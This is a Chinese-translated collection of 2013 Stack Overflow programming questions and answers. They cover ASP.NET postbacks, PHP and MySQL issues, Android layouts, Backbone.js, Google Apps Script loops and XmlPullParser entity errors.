> 赞同：1
> 
> 时间：2013-02-27T10:43:32.447
> 
> 标签：asp.net, .net, ajax, vb.net, postback

我有一个已设置的 Html 按钮`runat="server"`。当我单击此按钮时，有时会执行两次按钮代码，但仅限于在 Chrome 浏览器中运行时。我知道由于按钮位于更新面板中，我可以预料到这一点，但是当我在 Chrome 中运行时，我无法确定异步回发，因为值始终相同（即使在第二次执行时）：

```
IsPostBack = True
IsCallback = False
ScriptManager.GetCurrent(Me).IsInAsyncPostBack = True
ScriptManager1.IsInAsyncPostBack = True 
```

aspx页面如下：

```
<form id="form1" runat="server">
<div>
    <asp:ScriptManager ID="ScriptManager1" runat="server">
    </asp:ScriptManager>

    <asp:UpdatePanel ID="UpdatePanel1" runat="server">
        <ContentTemplate>  
            <button id="btnHtml1" runat="server" class="toolStripButton"><img src="../Images/ManLate32.png" alt="[Man Late]"/><br />Html Button</button>
            <button id="btnHtml2" runat="server" class="toolStripButton"><img src="../Images/PayCategory32.png" alt="[Pay Category]"/><br />Html Button 2</button>
        </ContentTemplate>
    </asp:UpdatePanel>

</div>
</form> 
```

我的代码背后：

```
Public Class ChromeBug
    Inherits System.Web.UI.Page

    Private Sub btnHtml1_Click(sender As Object, e As System.EventArgs) Handles btnHtml1.ServerClick
        Globals.SubmitCount += 1
        Debug.WriteLine(String.Format("Submit Count:{0} IsPostBack:{1} IsCallBack:{2} IsAsyncPostBack:{3} IsInAsyncPostBack2:{4}", Globals.SubmitCount, IsPostBack, IsCallback, ScriptManager.GetCurrent(Me).IsInAsyncPostBack, ScriptManager1.IsInAsyncPostBack.ToString))
    End Sub

    Private Sub btnHtml2_Click(sender As Object, e As System.EventArgs) Handles btnHtml2.ServerClick
        Globals.SubmitCount += 1
        Debug.WriteLine(String.Format("Submit Count:{0} IsPostBack:{1} IsCallBack:{2} IsAsyncPostBack:{3} IsInAsyncPostBack2:{4}", Globals.SubmitCount, IsPostBack, IsCallback, ScriptManager.GetCurrent(Me).IsInAsyncPostBack, ScriptManager1.IsInAsyncPostBack.ToString))
    End Sub
End Class 
```

我尝试添加 webkit javascript 文件，但似乎没有效果。我也在很多地方读到这是由于空的 src 值，但我没有这些。

# php - 将包含在标签中的代码写入其他页面

> ID：15110052
> 
> 赞同：0
> 
> 时间：2013-02-27T10:43:50.203
> 
> 标签：php, html

我正在研究从其他页面（默认模板页面）编写代码的代码。模板页面有一些 html 和一些 php 代码。html包含一些输入字段，php代码用于从这些字段中获取数据并将其插入到db表中，但我面临的问题是它只从默认页面获取html并将其写入新生成的页面并跳过所有代码被标签包围。

这是用于从默认模板页面获取代码并将其写入新生成的页面的 php 代码。

```
 if($aa){
       ob_end_clean();
       ob_start();
       include('test.php');
       $html = ob_get_contents();
       ob_end_clean();
       $ourFileName = $title.".php";
       file_put_contents($ourFileName, $html);
       fclose($ourFileHandle);
} 
```

tesp.php 包含这样的代码

```
 <?php 
       ...
       ...
       ...
       ?>
      <form....
      <input...
      <input...
      <input...
      </form> 
```

我将 test.php 页面设置为模板页面，以便通过上述代码生成的所有新页面都应具有此 php 和 html 代码

但输出是这样的

```
 <form....
      <input...
      <input...
      <input...
      </form> 
```

缺少 php 代码。希望你们能明白我想知道的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:54:48.600

而不是包含 php 文件，您应该**逐行读取文件并将其写入另一个地方**......或者只是制作一个副本（我不知道您要完成什么）。当您包含文件时，**标签中的任何内容都会得到处理，您会看到最终结果**

# php - 时间戳未插入 mysql 表中

> ID：15110055
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:44:00.127
> 
> 标签：php, mysql, timestamp, sql-insert

我有以下表结构：

```
recid                   int(11) 
userid                  int(11)
reset_requested_on      timestamp CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
valid_until             timestamp
sessionid               varchar(255) 
```

当我 print_r 我的数组时，我有以下数据：

```
 Array
(
    [userid] => 428
    [reset_requested_on] => 1361961459
    [valid_until] => 1362134259
    [sessionid] => b6d444e0ea14768a724308fd1aa64b6d
) 
```

当我执行插入时，只有 recid、用户 id 和 sessionid 被插入，而时间戳字段为空。谁能告诉我我做错了什么？

编辑：

当我手动添加记录时，如果我在时间戳字段中选择 FROM_UNIXTIME，我会正确插入记录。

任何人都知道我怎样才能将此选项设置为表格中的默认值？

问候，佐兰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:46:12.770

您插入时是否错过了时间戳的引号（“）？

```
"1362134259" 
```

我不知道。试试这个方法。

```
$newdata = array('userid' => $data['userid'],
                 'reset_requested_on' => "$timestamp",
                 'valid_until' => "$new_timestamp",
                 'sessionid' => $this->session->userdata('session_id')); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:07:41.193

您是否尝试过传递日期而不是秒？

基本上，要么在 MySQL 上使用 FROM_UNIXTIME(1362134259)，要么在 php 上使用 strtotime("Ymd H:i:s",1362134259)。

我对codeigniter不太熟悉，但我假设如下：

```
$data = array(
   'userid' => 428,
   'reset_requested_on' => date("Y-m-d H:i:s"),
   'valid_until' => date("Y-m-d H:i:s"),
   'sessionid' => 'b6d444e0ea14768a724308fd1aa64b6d'
); 
```

应该可以完美运行。

时间戳和日期时间之间的主要区别在于数据是如何在内部保存的。时间戳字段保存为自 Unix 纪元以来的秒数，存储为 32 位整数（因此它容易受到 y2k38 错误的影响），而日期时间字段以已知格式保存以表示日期。日期时间字段的数学运算比时间戳字段更昂贵，但从“客户”的角度来看，除非您使用的日期晚于 2038 年，否则它们几乎是相同的。

因此，离开 PHP 并进入 MySQL 的查询应该具有预期格式的日期，例如“Ymd H:i:s”。

# sql - 事务回滚时更新统计的行为

> ID：15110058
> 
> 赞同：2
> 
> 时间：2013-02-27T10:44:14.710
> 
> 标签：sql, sql-server, ddl

在我们的应用程序中，我们正在运行查询“使用样本 30% 更新统计信息”。

我们的系统设计是这样的，我们必须每天使用一次更新统计查询来提高查询性能。

我们将自动提交设置为 false，运行“更​​新统计信息”，然后一些失败的查询导致连接回滚。

在这种情况下，“更新统计”查询也会回滚吗？我应该第二次再次运行 update statistics 命令吗？'update statistics' 自动提交，还是我应该在 'update statistics' 之后提交，然后执行剩余的查询？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:15:30.933

更新统计信息将与事务的其余部分一起回滚。

# android - ScrollView 中的自定义 Gridview

> ID：15110060
> 
> 赞同：2
> 
> 时间：2013-02-27T10:44:15.813
> 
> 标签：android, layout, gridview

我的自定义 Gridview 有问题。我已根据此解决方案[自定义 GridView](https://stackoverflow.com/questions/8481844/gridview-height-gets-cut)完成此操作，我在所有设备上都可以正常工作，但具有 layout-sw360（Galaxy Nexus，Galaxy S3）的设备除外。网格最后两个元素下方的文本未完全显示。感谢您的帮助，抱歉英语不好

![问题](../Images/0e6d88cf019f8bc77cbf4f30981a44be.png)

我的布局

```
<ScrollView
         android:layout_width="fill_parent"
         android:layout_height="fill_parent"
         android:scrollbars="none">

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:orientation="vertical">

            <cz.xx.xxx.utils.CustomGridView
                    android:id="@+id/productGridview"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center_horizontal"
                    android:numColumns="2"
                    android:listSelector="#00000000"
                    android:horizontalSpacing="5dip"
                    android:visibility="visible"
                    android:background="@null"
                    android:scrollbars="none"
                    android:paddingLeft="10dp"
                    android:paddingTop="10dp"
                    android:paddingRight="10dp"
                    android:layout_marginBottom="20dp">
            </cz.xxx.xxx.xxx.CustomGridView>

            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="80dp"
                android:id="@+id/img_dobre_jistoty"
                android:layout_gravity="center"
                android:adjustViewBounds="true"
                android:clickable="true"
                android:contentDescription="obr"
                android:src="@drawable/img_cdjabout" 
                android:onClick="cdjClick"
                android:layout_marginBottom="5dp" 
                android:layout_marginTop="30dp"/>

            <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="xxx"
                    android:id="@+id/textView"
                    android:layout_gravity="center"
                    android:layout_marginBottom="10dp"
                    android:layout_marginTop="-3dp"
                    android:singleLine="true"
                    android:textColor="#000000"
                    android:textSize="12dp"
                    android:textStyle="bold"/>

        </LinearLayout>
     </ScrollView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-11-15T12:13:20.863

您可以在滚动视图中使用 **android:fillViewport="true"**并设置布局高度以匹配您的内容。

像这样：

```
<ScrollView
         android:layout_width="fill_parent"
         android:layout_height="500dp"
         android:scrollbars="none"
         android:fillViewport="true"> 
```

# javascript - 如何在js文件中包含js文件？

> ID：15110061
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:44:17.717
> 
> 标签：javascript, include

我搜索了这个主题，但他们都提到包括在我没有的 HTML 文件中。我只在一些 php 应用程序中使用 js 文件，所以没有 HTML！

我有 js 文件**1.js**

```
function check_custom_data()
{
    YAHOO.SUGAR.MessageBox.show({msg: 'Fodo', type: 'plain'} );
} 
```

这个 YAHOO 函数是在一些**2.js**文件中定义的。（在示例路径上是`/custom/2.js`）

如何包含它？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:01:48.290

您的 PHP（很可能）正在生成 HTML。您需要找到负责生成 HTML 头标记的 PHP 文件，并且从那里您将能够包含其他脚本。您也可以使用 AMD 来延迟加载 JS 文件，但对于这种简单的情况，这不是必需的。

# symfony1 - 供应商类未正确自动加载

> ID：15110064
> 
> 赞同：0
> 
> 时间：2013-02-27T10:44:26.053
> 
> 标签：symfony1, symfony-1.4

我想将[mpdf](http://mpdf1.com/)库与 symfony1.4 一起使用

我已将库下载到`lib/vendor/mPDF`并更新了我的`autoload.yml`文件`config/autoload.yml`以包含以下内容：

```
mPDF:
  name:       mPDF
  path:       %SF_LIB_DIR%/vendor/mPDF
  recursive:  on 
```

然后当我实例化 mPDF 类时，

```
$mdpf = new mPDF(); 
```

我得到以下信息：

```
Fatal Error: Class 'mPDF' not found 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:13:12.157

你的自动加载文件应该是这样的：

```
autoload:
  mPDF:
    path:      %SF_LIB_DIR%/vendor/mPDF 
```

你必须有一个第一级`autoload`。

顺便说一句，在您的情况下，您只需要加载一个文件，因此您不必定义`recursive: on`和`name`.

# php - 垂直表，动态获取数据

> ID：15110068
> 
> 赞同：0
> 
> 时间：2013-02-27T10:44:43.200
> 
> 标签：php, sql, dynamic, html-table

我正在尝试制作一张桌子，其中有：

*   左侧的列名称。
*   数据垂直。
*   在下一个 sql 行上水平扩展而不是垂直扩展。

简而言之，与普通桌子完全相反。

此外，水平展开的数据将在顶部有一个名为 Solution X 的标题（X 表示实际列的编号，图片使一切都清楚）。

我添加了一张图片，它应该可以清楚地说明我试图实现的目标，并附有指导方针。！

图片：

[![](../Images/c2a8530de264a0f7a907623f70204a08.png)](https://i.stack.imgur.com/HBcoH.jpg)

这样做的代码是：

```
<table border="1">
  <tr>
    <th></th>
    <th>Solution 1</th>
    <th>Solution 2</th>
    <th>Solution 3</th>
  </tr>
  <?
 while($result = mysql_fetch_array( $data )) 
 { ?>
  <tr>
    <td>SHIPPINGLINE</td>
    <th><? echo $result["SHIPPINGLINE"]; ?></th>
  </tr>
  <tr>
    <td>POL</td>
    <th><? echo $result["POL"]; ?></th>
  </tr>
  <?
 } 

 //This counts the number or results - and if there wasn't any it gives them a little     message explaining that 
 $anymatches=mysql_num_rows($data); 
 if ($anymatches == 0) 
 { 
 echo "Sorry, but we can not find an entry to match your query.<br><br>"; 
 } 

 //And we remind them what they searched for 
 echo "<b>Searched For:</b> " .$findone. " and " .$findtwo;
 } 
 ?>
    </table> 
```

我被卡住了，因为正如您所看到的，不断发生的事情是获取的下一个“sql 行”始终出现在第一个下方。我想要的是下一个“sql 行”必须位于下一个“解决方案编号”之下。

如果你能帮助我解决这个问题，我将不胜感激。如果您需要更多详细信息，请随时询问:)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:04:55.790

```
<?php
$output = array();
$c=1;
while($result = mysql_fetch_array( $data )) 
{
  $output[$c]['shippingline'] = $result['shippingline'];
  $output[$c]['pol'] = $result['pol'];
      $c++;
}
?>
<table border="1">
<tr>
<th></th>
<?php
foreach ($output as $key => $html)
{
echo "<th>Solution ".$key."</th>";
}
?>
</tr>
<tr>
    <td>Shipping Line</td>
<?php
foreach ($output as $key => $html)
{
echo "<td>".$html['shippingline']."</td>";
}
?>
</tr>
<tr>
    <td>POL</td>
<?php
foreach ($output as $key => $html)
{
echo "<td>".$html['pol']."</td>";
}
?>
</tr>   
</table> 
```

# dynamics-crm-2011 - 错误：重复的录制按钮

> ID：15110070
> 
> 赞同：1
> 
> 时间：2013-02-27T10:44:48.980
> 
> 标签：dynamics-crm-2011, crm, jscript

我正在构建一个测试解决方案，为了测试我的目标是在单击按钮时创建一个帐户的重复模板，然后插件会触发以包含所有相关联系人的副本。

我目前正在做与[这篇文章类似的事情](http://garethtuckercrm.com/tag/openentityform/)

但是：这里有一些代码......

```
function CopyAccount() {
   //Collect values from the existing CRM form that you want to default onto your new record    
   var GUIDvalue = Xrm.Page.data.entity.getId();
   var Namevalue = Xrm.Page.getAttribute("name").getValue();

   if (GUIDvalue != null && Namevalue != null) 
   {
      var parameters = {};
      parameters["new_templateid"] = GUIDvalue;
      parameters["name"] = Namevalue;
      Xrm.Utility.openEntityForm("account", null, parameters);
   } 
```

我得到一个错误：`SCRIPT5022: id must not be null.`

来自 global.ashx?ver=-1477464416，第 6 行字符 372572

```
Xrm.Utility.openEntityForm=function(name,id,parameters){
     if(IsNull(name)) trow Error.create("name must not be null.");
     if(IsNull(id)) throw Error.create("id must not be null.");
     if(IsNull(parameters)) throw Error.create("parameters must not be null.") 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:02:50.180

在另一个论坛上找到了这个主题 [http://social.microsoft.com/Forums/en-US/crm/thread/33b7b18a-195e-4d7d-9c19-a6ad4e16a672](http://social.microsoft.com/Forums/en-US/crm/thread/33b7b18a-195e-4d7d-9c19-a6ad4e16a672)

# android - Apple 和 Android 推送服务的速度和可靠性如何？我应该使用我的彗星服务器吗？

> ID：15110074
> 
> 赞同：0
> 
> 时间：2013-02-27T10:45:03.560
> 
> 标签：android, ios, mobile, push-notification

我正在开发一个用于移动/平板电脑的网络应用程序。我应该使用这些服务还是制作自己的彗星服务器？我想要一个快速（<3 秒）且可靠（100%）的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:42:25.757

Apple doc for push notification 它自己说：

```
Remember that delivery of notifications is “best effort” and is not guaranteed. 
```

您可以在此处阅读： [关于本地通知和推送通知：通知有效负载](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/ApplePushService/ApplePushService.html#//apple_ref/doc/uid/TP40008194-CH100-SW1)

# .net - 从网络共享读取文件会将其创建时间设置为其最后一次写入时间

> ID：15110076
> 
> 赞同：6
> 
> 时间：2013-02-27T10:45:08.623
> 
> 标签：.net, windows, file-io, network-share

当我从网络共享读取文件时，它会将创建时间更新为上次写入时间。这会导致 System.Configuration.Configuration 出现问题，因为它认为文件已更改并因此引发异常（配置文件已被另一个程序更改。）。解决方法是事先手动将创建时间设置为最后一次写入时间。但我想知道这是否是一个已知问题。

这是一些测试代码：

```
 string filePath = @"X:\SomeFile.txt";
    FileInfo fileInfo = new FileInfo(filePath);
    DateTime creationTimeBeforeRead = fileInfo.CreationTimeUtc;
    FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
    byte[] result = new byte[fileStream.Length];
    fileStream.Read(result, 0, (int)fileStream.Length);
    fileStream.Close();
    fileInfo.Refresh();
    DateTime creationTimeAfterRead = fileInfo.CreationTimeUtc; 
```

我不知道问题出在 .net、Windows API 还是服务器端。有没有人有任何见解？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-17T14:33:53.267

我知道这是一个老问题，但我在我的家庭 Linux 服务器（非常旧的 NAS 盒）上组织一些图像文件时遇到了这个问题。文件创建时间变成了文件复制时间，我发现问题是由于 EXT3 Linux 文件格式不支持任何类型的共享（NFS 和 SAMBA）。将文件移动到 EXT4 和 XFS 文件系统格式解决了我的问题。

# php - 会话没有将我的变量保存在数组中：array(1) { [0]=> NULL }

> ID：15110079
> 
> 赞同：0
> 
> 时间：2013-02-27T10:45:14.900
> 
> 标签：php, session

我现在唯一的问题是，当我单击提交按钮时，它不想保存我的会话。您可以点击以下链接查看我的代码：

[http://pastie.org/6348801](http://pastie.org/6348801)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:49:14.867

您从未设置会话变量（至少在您提供的代码中没有），您只为 $session 分配了一个空会话变量。

去做吧：

```
$_SESSION['productid3'] = 'your data'; 
```

# c# - 在 javascript 中显示 (ViewData["scripts"] as StringBuilder)

> ID：15110080
> 
> 赞同：0
> 
> 时间：2013-02-27T10:45:15.290
> 
> 标签：c#, asp.net-mvc-4

我需要帮助来获得这个转换器，所以它可以正确地输出 html ;-)

> 测试控制器.cs

```
String script = viggo.notice(0,"Desværre! Du er ikke logget ind.");

protected void AppendScript(string script)
        {
            ViewData["script"] = new StringBuilder();
            (ViewData["scripts"] as StringBuilder).Append(script);
        } 
```

* * *

> 测试.cshtml

```
<script type="text/javascript">
        @Convert.ToString(ViewData["scripts"])
</script> 
```

* * *

> 结果

```
<script type="text/javascript">

            viggo.notice(0,&quot;Desv&#230;rre! Du er ikke logget ind.&quot;);

</script> 
```

**我要这个**

```
<script type="text/javascript">
            viggo.notice(0,"Desværre! Du er ikke logget ind.");  
     </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:50:29.747

**更新**，这看起来更好：

```
@Html.Raw(ViewData["scripts"]) 
```

尝试这样的事情：

```
@MvcHtmlString.Create(ViewData["scripts"].ToString()) 
```

我认为 æ 不应该是一个问题，这会出来的权利。

既然`@Html.Raw()`出现了：[这](https://stackoverflow.com/questions/10331019/difference-between-mvchtmlstring-create-and-html-raw)`@Html.Raw`将提供有关vs的更多信息`@MvcHtmlString.Create`。

# google-apps-script - GAS 循环“for”和调用函数

> ID：15110083
> 
> 赞同：-2
> 
> 时间：2013-02-27T10:45:25.520
> 
> 标签：google-apps-script

我正在尝试优化一些东西。我的脚本：

```
function d1() {     
  for (i = 0; i < 1; i++) {    
     d1();     
   }     
   Logger.log("DONE!");   
 }

 function d2() {    
   for (i = 1; i < 2; i++)       
     Logger.log("IN PROGRESS...");     
 } 
```

这个脚本永远不会完成！但如果我改为

```
function d1() {
  for (i = 0; i < 1; i++) {
    for (i = 1; i < 2; i++)
      Logger.log("IN PROGRESS...");
  }
  Logger.log("DONE!");
} 
```

一切都很完美！我的问题是什么？

哦，我很愚蠢。当然我叫d2()。

我的脚本完全不同，我尽量简化，但我想我最好发送原件，我希望它会清楚。

项目.gs

```
 function ViewNewProjects() { 

  var app = UiApp.getActiveApplication();  

  var wait = app.getElementById("wait");  
  wait.setStyleAttribute("display","none");

  var spreadsheet = SpreadsheetApp.openById("0AnYzxNSJL2u_dDVETm9JNVAxQ3BESmdoNGZnc1JDN2c");
  var sheet = spreadsheet.getSheetByName("Заявки Технического Отдела");
  var data = app.getElementById("Data_Panel");
  var range = sheet.getDataRange();
  var values = range.getValues();
  var bg = true;

  data.clear();

  for (i=2; i<values.length; i++) {

    var row = app.createHorizontalPanel();

    var techSpec = app.createHTML(values[i][4]);
    var status = app.createHTML(values[i][11]);

    if (values[i][4].length == 0 && values[i][12] != "Закрыт") {

      var projectLabel = app.createHTML(values[i][0] + ", " + values[i][2]);
      var typeLabel = app.createHTML(values[i][1]);
      var postLabel = app.createHTML(values[i][5]);
      var startDateLabel = app.createHTML(values[i][6]);
      **var expDateLabel = app.createHTML(EstimateData(values[i][7]));**
      var buttonGet = app.createButton("Взять проект");

      var getProject = app.createServerHandler("ViewProject");
      var ShowWait = app.createServerHandler("ShowWait"); 

      projectLabel.setId("project_id_" + i);
      projectLabel.addClickHandler(ShowWait);
      projectLabel.addClickHandler(getProject);

      row.setWidth("100%");

      projectLabel.setStyleAttribute("margin", "3"); 
      projectLabel.setStyleAttribute("padding", "10px"); 

      typeLabel.setStyleAttribute("margin", "3"); 
      typeLabel.setStyleAttribute("padding", "10px"); 

      postLabel.setStyleAttribute("margin", "3"); 
      postLabel.setStyleAttribute("padding", "10px");

      startDateLabel.setStyleAttribute("margin", "3"); 
      startDateLabel.setStyleAttribute("padding", "10px");

      expDateLabel.setStyleAttribute("margin", "3"); 
      expDateLabel.setStyleAttribute("padding", "10px");

      if (bg == true) {

        projectLabel.setStyleAttribute("background-color", "#e9e9e9");
        typeLabel.setStyleAttribute("background-color", "#e9e9e9");
        postLabel.setStyleAttribute("background-color", "#e9e9e9");
        startDateLabel.setStyleAttribute("background-color", "#e9e9e9");
        expDateLabel.setStyleAttribute("background-color", "#e9e9e9");

        bg = false;

      } else {

        projectLabel.setStyleAttribute("background-color", "#f9f9f9");
        typeLabel.setStyleAttribute("background-color", "#f9f9f9");
        postLabel.setStyleAttribute("background-color", "#f9f9f9");
        startDateLabel.setStyleAttribute("background-color", "#f9f9f9");
        expDateLabel.setStyleAttribute("background-color", "#f9f9f9");

        bg = true;

      }

      projectLabel.setStyleAttribute("cursor", "pointer");  
      projectLabel.setStyleAttribute("color", "blue");  
      projectLabel.setStyleAttribute("text-decoration", "underline"); 

      row.add(projectLabel)
         .add(typeLabel)
         .add(postLabel)
         .add(startDateLabel)
         .add(expDateLabel)
         .add(buttonGet);

      row.setCellHorizontalAlignment(projectLabel, UiApp.HorizontalAlignment.LEFT);
      row.setCellVerticalAlignment(projectLabel, UiApp.VerticalAlignment.MIDDLE);
      row.setCellWidth(projectLabel, "320px");

      row.setCellHorizontalAlignment(typeLabel, UiApp.HorizontalAlignment.CENTER);
      row.setCellVerticalAlignment(typeLabel, UiApp.VerticalAlignment.MIDDLE);
      row.setCellWidth(typeLabel, "120px");

      row.setCellHorizontalAlignment(postLabel, UiApp.HorizontalAlignment.CENTER);
      row.setCellVerticalAlignment(postLabel, UiApp.VerticalAlignment.MIDDLE);
      row.setCellWidth(postLabel, "200px");

      row.setCellHorizontalAlignment(startDateLabel, UiApp.HorizontalAlignment.CENTER);
      row.setCellVerticalAlignment(startDateLabel, UiApp.VerticalAlignment.MIDDLE);
      row.setCellWidth(startDateLabel, "80px");

      row.setCellHorizontalAlignment(expDateLabel, UiApp.HorizontalAlignment.CENTER);
      row.setCellVerticalAlignment(expDateLabel, UiApp.VerticalAlignment.MIDDLE);
      row.setCellWidth(expDateLabel, "80px");

      row.setCellHorizontalAlignment(buttonGet, UiApp.HorizontalAlignment.CENTER);
      row.setCellVerticalAlignment(buttonGet, UiApp.VerticalAlignment.MIDDLE);

      data.add(row);

    }

  }

  return app;

 }; 
```

假期.gs

```
function EstimateData(date_to_estimate) {

  var date = new Date();
  var count = 0;

  var mounth = new String(date.getMonth() + 1);
  var day = new String(date.getDate());
  var year = new String(date.getFullYear());

  if (mounth < 10)

    mounth = new String("0" + mounth);

  var current_date = year + mounth + day;

  var ___date_to_estimate = new String(date_to_estimate);
  var date_to_estimate_array = ___date_to_estimate.match(/(\d+)\.(\d+)\.(\d+)/); 
  var ___date_to_estimate = date_to_estimate_array[3] + date_to_estimate_array[2] + date_to_estimate_array[1];

  current_date = Number(current_date);
  ___date_to_estimate = Number(___date_to_estimate);

  if (current_date > ___date_to_estimate) {

    Logger.log("Текущая дата больше рассчитываемой");

    var difference = Number(current_date - ___date_to_estimate);

    Logger.log("Разница " + difference);

    if (difference == 0) {

      return date_to_estimate;

    } else if (difference < 31) {

      var weekday = date.getDay();

      Logger.log("День недели " + weekday);

      for (i = 1; i < difference; i++) {

        if (weekday == 7)

          weekday = 0;

        if (weekday > 0 && weekday < 6) {

          count++;

        }

        weekday++;

      }

    } else if (difference < 1130) {

    } else {

    }

  } else if (current_date == ___date_to_estimate) {

    date_to_estimate = '<b>Сегодня!!!</b>';

  } else {

  }

  Logger.log("Количество рабочих дней " + count);

  return date_to_estimate;

} 
```

在编写消息和测试时，我发现了我的错误。

projects.gs 中的循环包含变量 i holadays.gs 中的循环包含变量 i

我改变了变量，没关系！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:07:23.617

您有无限递归，因为您在for 循环`d1()`内部调用。`d1()`

你的第一个功能应该是

```
function d1() {     
  for (i = 0; i < 1; i++) {    
     d2();     
   }     
   Logger.log("DONE!");   
 } 
```

# backbone.js - Backbone.js 中控制器的编码在哪里

> ID：15110085
> 
> 赞同：0
> 
> 时间：2013-02-27T10:45:30.767
> 
> 标签：backbone.js

我的意思是我已经创建了 Backbone.View.Extend 和 Backbone.Model.Extend。但是我还没有完成 Backbone.Controller.Extend 的编码 那么控制器的代码究竟是从哪里来的呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T10:58:49.227

Backbone 与传统的 Model-View-Controller 概念有何不同：

> 模型-视图-控制器模式的不同实现往往对控制器的定义存在分歧。如果有帮助的话，在 Backbone 中，View 类也可以被认为是一种控制器，调度源自 UI 的事件，而 HTML 模板作为真正的视图。我们称它为 View 是因为它代表 UI 的逻辑块，负责单个 DOM 元素的内容。
> 
> 将 Backbone 的整体结构与 Rails 等服务器端 MVC 框架进行比较，各部分排列如下：
> 
> **Backbone.Model** – 就像 Rails 模型减去类方法。在业务逻辑中包装一行数据。
> 
> **Backbone.Collection** – 一组客户端模型，具有排序/过滤/聚合逻辑。
> 
> **Backbone.Router** – Rails routes.rb + Rails 控制器操作。将 URL 映射到函数。
> 
> **Backbone.View** – 一个合乎逻辑的、可重用的 UI。通常但不总是与模型相关联。客户端模板——Rails .html.erb 视图，渲染一大块 HTML。

[资源](http://backbonejs.org/#FAQ-mvc)

所以基本上你可以在你的路由中添加你的控制器，或者在模型和/或视图之间拆分它。Backbone 在这方面非常灵活，你是否想要构建你的代码取决于你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T05:41:44.417

这是 Backbone 的控制器。

[http://chance-an.github.io/backbone-mvc](http://chance-an.github.io/backbone-mvc)

# java - XMLPullParser 解析器无法解析 "(??????) [????] ·" inside xml 标签

> ID：15110087
> 
> 赞同：2
> 
> 时间：2013-02-27T10:45:45.227
> 
> 标签：java, exception, xml-parsing

我正在用 Jsoup 解析 XMLPullParser

```
<title>(??????) [????]0 BLACK LAGOON -???? &middot; ????- ?01-09?</title>
        <guid isPermaLink='true'>http://fenopy.eu/torrent/+black+lagoon+A+01+09+/OTcyOTA3Mw</guid>
        <pubDate>Wed, 27 Feb 2013 11:00:04 GMT</pubDate>
        <category>Anime</category>
        <link>http://fenopy.eu/torrent/+black+lagoon+A+01+09+/OTcyOTA3Mw</link>
        <enclosure url="http://fenopy.eu/torrent/-BLACK-LAGOON-01-09-/OTcyOTA3Mw==/download.torrent" length="569296173" type="application/x-bittorrent" />
        <description><![CDATA[ Category: Anime<br/>Size: 542.9 MB<br/>Ratio: 0 seeds, 3 leechers<br/> ]]></description>
        </item> 
```

这是我的解析代码

```
int eventType = -1;

            while (eventType != XmlPullParser.END_DOCUMENT) {
                switch (eventType) {
                // at start of document: START_DOCUMENT
                case XmlPullParser.START_DOCUMENT:                      
                    break;

                // at start of a tag: START_TAG
                case XmlPullParser.START_TAG:
                    // get tag name
                    String tagName = parser.getName();

                    if (tagName.equalsIgnoreCase(TAG_TITLE))                            
                        String t = parser.nextText(); 
```

当我调用下一个文本并引发以下异常时..

```
org.xmlpull.v1.XmlPullParserException: unresolved: &middot; (position:TEXT (??????) [????] ...@36:59 in java.io.StringReader@40540698) 
at org.kxml2.io.KXmlParser.exception(KXmlParser.java:273)
at org.kxml2.io.KXmlParser.error(KXmlParser.java:269)
at org.kxml2.io.KXmlParser.pushEntity(KXmlParser.java:818)
at org.kxml2.io.KXmlParser.pushText(KXmlParser.java:849)
at org.kxml2.io.KXmlParser.nextImpl(KXmlParser.java:354)
at org.kxml2.io.KXmlParser.next(KXmlParser.java:1378)
at org.kxml2.io.KXmlParser.nextText(KXmlParser.java:1432) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-11-08T22:11:31.587

我正在处理同样的问题，我找到了超级简单的解决方案：

```
xmlPullParser.setFeature(Xml.FEATURE_RELAXED, true); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:04:08.043

您的 xml 无效。`&middot;`对 xml 的引用无效。

XML 中有 5 个预定义的实体引用：

`&lt;` < 小于

`&gt;` > 大于

`&amp;`& & 号

`&apos;` ' 撇号

`&quot;` " 引号

**更新**

简单使用正则表达式替换 XML 中的所有 HTML 字符

```
XMLString.replaceAll("(&[^\\s]+?;)", "")); 
```

这将替换`&middot;`为“”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:15:48.250

也许你可以这样做：

```
parser.setInput(...);
parser.defineEntityReplacementText("middot", "•"); 
```

* * *

***因为这不适用于您的实现：***

从 apache commons-lang 使用 HTML 转换，因为它似乎是 HTML 命名实体：

```
String xml = "<foo>Hello &middot; World!</foo>";
xml = StringEscapeUtils.unescapeHtml(xml); 
```

* * *

***评论问题：***

替换所有不分青红皂白的：

```
String xml = "<...";

// Place all entities like "&middot;" in square brackets: "[middot]":
xml = xml.replaceAll("\\&(\\w+);", "[$1]");

// But not for the xml entities:
xml = xml.replaceAll("\\[(lt|gt|amp|quot|apos)\\]", "&$1;"); 
```

# jquery - jquery展开只折叠已点击的div

> ID：15110096
> 
> 赞同：0
> 
